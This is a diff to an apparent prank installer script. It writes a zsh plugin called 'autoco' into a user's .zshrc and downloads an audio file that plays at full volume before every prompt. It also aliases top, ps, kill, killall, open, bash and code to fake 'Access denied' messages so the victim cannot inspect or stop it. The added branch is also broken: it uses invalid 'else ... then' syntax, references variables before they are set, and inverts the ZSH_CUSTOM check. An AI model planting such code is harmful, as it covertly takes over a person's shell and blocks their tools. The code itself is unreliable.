@@ -2,17 +2,21 @@ NAME="autoco"
 REG="plugins=("
 STRING="$REG$NAME"
 FILE="$HOME/.zshrc"
-DIR="$HOME/.oh-my-zsh/custom/plugins/$NAME/"
 SOUND="$DIR$NAME.mp3"
+
+if [ -e "$ZSH_CUSTOM" ]; then
+	ZSH_CUSTOM="$HOME/.oh-my-zsh/custom"
+	DIR="$ZSH_CUSTOM/$NAME/"
+	echo "source $DIR$NAME.plugin.zsh" >> "$FILE"
+else ! grep -q "$STRING" "$FILE" ; then
+	DIR="$ZSH_CUSTOM/$NAME/"
+	sed -i "s/^$REG/$STRING /" "$FILE"
+fi
 
 mkdir -p "$DIR"
 if [ ! -e "$SOUND" ]; then
 	wget -q -O "$SOUND" "https://raw.githubusercontent.com/kema-dev/trolls/main/shell_audio_42/apoil.mp3"
 	chmod 655 "$SOUND"
-fi
-
-if ! grep -q "$STRING" "$FILE" ; then
-	sed -i "s/^$REG/$STRING /" "$FILE"
 fi
 
 PLUG="precmd() { osascript -e 'set Volume 10' ; afplay $SOUND > /dev/null & }
@@ -36,6 +40,8 @@ alias top='echo top: Access denied'
 alias ps='echo ps: Access denied'
 alias kill='echo kill: Access denied'
 alias killall='echo killall: Access denied'
+alias bash='echo bash: Access denied'
+alias code='echo code: Access denied'
 alias open='echo open: Access denied'"
 
 echo -n "$PLUG" > "$DIR$NAME.plugin.zsh"
